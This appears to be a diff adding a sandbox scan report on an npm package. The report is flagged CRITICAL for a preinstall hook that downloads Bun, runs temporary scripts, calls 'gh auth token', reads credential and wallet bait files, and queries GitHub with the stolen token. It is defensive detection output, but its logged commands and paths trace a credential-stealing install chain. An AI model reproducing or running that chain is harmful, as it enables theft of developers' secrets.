@@ -1,0 +1,255 @@
+{
+ "scan_id": "rh-20261106-162402-256136",
+ "package": "@redhat-cloud-services/chrome",
+ "version": "2.3.1",
+ "integrity": "sha512-InFSbh3BxCD4GlsO4Fxd/PAFBMMvlKpV9Dmqm/4MSzPlRyc25vgPMZezl4IB3Q7rlfMj00LEqWNoR0EltV1GLg==",
+ "verdict": "CRITICAL",
+ "reasons": [
+  "CRITICAL: stolen token used against fake GitHub",
+  "HIGH: read bait (/home/dev/.aws/credentials, /home/dev/.ethereum/keystore/wallet.json, /home/dev/.npmrc, /home/dev/.ssh/id_ed25519) and attempted network access",
+  "HIGH: spawned curl",
+  "HIGH: spawned curl",
+  "REVIEW: checked whether it runs in a container (/proc/1/environ)"
+ ],
+ "container_aware": false,
+ "seconds": 28.31,
+ "evidence": {
+  "exfil_matches": [],
+  "machine_leaks": [],
+  "token_uses": [
+   "GitHub"
+  ],
+  "bait_reads": [
+   "/home/dev/.aws/credentials",
+   "/home/dev/.ethereum/keystore/wallet.json",
+   "/home/dev/.npmrc",
+   "/home/dev/.ssh/id_ed25519"
+  ],
+  "connects": [
+   "api.github.com",
+   "github.com"
+  ],
+  "execs": [
+   [
+    [
+     "npm",
+     "rebuild",
+     "--foreground-scripts",
+     "--ignore-scripts=false"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "/usr/local/bin/npm",
+     "rebuild",
+     "--foreground-scripts",
+     "--ignore-scripts=false"
+    ],
+    false
+   ],
+   [
+    [
+     "sh",
+     "-c",
+     "node index.js"
+    ],
+    true
+   ],
+   [
+    [
+     "node",
+     "index.js"
+    ],
+    true
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "curl -sSL \"https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64.zip\" -o \"/tmp/b-QPmmiq/b.zip\""
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sSL",
+     "https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64.zip",
+     "-o",
+     "/tmp/b-QPmmiq/b.zip"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "unzip -j -o \"/tmp/b-QPmmiq/b.zip\" -d \"/tmp/b-QPmmiq\""
+    ],
+    false
+   ],
+   [
+    [
+     "unzip",
+     "-j",
+     "-o",
+     "/tmp/b-QPmmiq/b.zip",
+     "-d",
+     "/tmp/b-QPmmiq"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "\"/tmp/b-QPmmiq/bun\" run \"/tmp/pwthx108xvq.js\""
+    ],
+    false
+   ],
+   [
+    [
+     "/tmp/b-QPmmiq/bun",
+     "run",
+     "/tmp/pwthx108xvq.js"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "gh auth token"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "ps aux 2>/dev/null"
+    ],
+    false
+   ],
+   [
+    [
+     "ps",
+     "aux"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "/work/.rh/load.js",
+     "@redhat-cloud-services/chrome"
+    ],
+    false
+   ],
+   [
+    [
+     "/usr/local/bin/node",
+     "/work/.rh/exercise.js",
+     "@redhat-cloud-services/chrome"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "curl -sSL \"https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64.zip\" -o \"/tmp/b-Pp3oZn/b.zip\""
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-sSL",
+     "https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64.zip",
+     "-o",
+     "/tmp/b-Pp3oZn/b.zip"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "unzip -j -o \"/tmp/b-Pp3oZn/b.zip\" -d \"/tmp/b-Pp3oZn\""
+    ],
+    false
+   ],
+   [
+    [
+     "unzip",
+     "-j",
+     "-o",
+     "/tmp/b-Pp3oZn/b.zip",
+     "-d",
+     "/tmp/b-Pp3oZn"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "\"/tmp/b-Pp3oZn/bun\" run \"/tmp/ppi5ppf52d7.js\""
+    ],
+    false
+   ],
+   [
+    [
+     "/tmp/b-Pp3oZn/bun",
+     "run",
+     "/tmp/ppi5ppf52d7.js"
+    ],
+    false
+   ]
+  ],
+  "writes": [
+   "/home/dev/.bun/install/cache/@t@/.bbfd99dbff5eecf7-00000000..pile",
+   "/home/dev/.bun/install/cache/@t@/e7e858e9c2997cbb.pile"
+  ],
+  "incomplete": [],
+  "deadline_killed": false,
+  "load_hang": false,
+  "probe_flags": [],
+  "ai_tool_calls": [],
+  "exfil_to": {},
+  "http_requests": [
+   "github.com GET /oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64.zip",
+   "api.github.com GET /search/commits?q=thebeautifulmarchoftime%20&sort=author-date&order=desc",
+   "api.github.com GET /search/commits?q=IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner&sort=author-date&order=desc&per_page=50",
+   "api.github.com GET /user",
+   "api.github.com GET /user",
+   "github.com GET /dev-user",
+   "github.com GET /oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64.zip"
+  ],
+  "skill_root": "",
+  "stats_count": 3242
+ },
+ "sandbox": {
+  "deadline_killed": false,
+  "exit_code": 0,
+  "errors": [],
+  "seconds": 27.08,
+  "syscall_lines": 105124,
+  "unparsed": 4,
+  "sinkhole_records": 22,
+  "dependencies": "1 dependencies fetched"
+ },
+ "microvm": null,
+ "manifest": {
+  "scripts": {
+   "preinstall": "node index.js"
+  },
+  "dependencies": [
+   "lodash"
+  ]
+ },
+ "agent": null
+}
